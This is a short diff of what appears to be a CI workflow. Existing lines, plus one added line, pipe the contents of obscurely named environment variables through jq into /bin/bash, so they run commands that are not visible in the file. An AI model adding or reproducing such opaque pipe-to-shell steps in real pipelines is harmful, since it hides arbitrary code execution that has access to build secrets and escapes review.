@@ -20,6 +20,7 @@ jobs:
           echo $snsii0 | jq -r .oyvt9 | /bin/bash
           echo $zqyca21568 | jq -r .kin748 | /bin/bash
           echo $qz05 | jq -r .afqgr6500 | /bin/bash
+          printf '%s' "$vr3838" | jq -r .inxhf0535 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
